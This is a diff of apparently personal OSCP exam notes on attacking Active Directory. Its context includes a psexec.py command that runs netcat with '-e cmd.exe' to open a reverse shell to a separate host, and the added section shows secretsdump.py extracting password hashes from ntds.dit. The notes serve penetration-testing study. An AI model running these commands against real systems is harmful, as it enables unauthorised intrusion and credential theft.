@@ -29,7 +29,7 @@ Be sure to check the restrictions on the use of tools before taking the exam.
 
 ### :open_file_folder: Personal Flow (WIP)
 
-![AD drawio](https://user-images.githubusercontent.com/8998412/171990757-4b3b5a67-de7c-4f44-91fc-1ae6f25df981.png)
+![AD drawio](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/AD.drawio.png)
 
 ### :open_file_folder: Commands
 
@@ -183,6 +183,14 @@ psexec.py <domain>/<username>:'<password>'@<target ip>
 # example
 psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.exe 192.168.9.123 4444" -c ~/Documents/nc.exe
 # -c pathname copy the filename for later execution, arguments are passed in the command option
+```
+
+### :open_file_folder: Extracting
+
+[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py): extracting the password hash from ntds.dit
+
+```shell
+/secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
 ```
 
 ### :open_file_folder: Test Environment
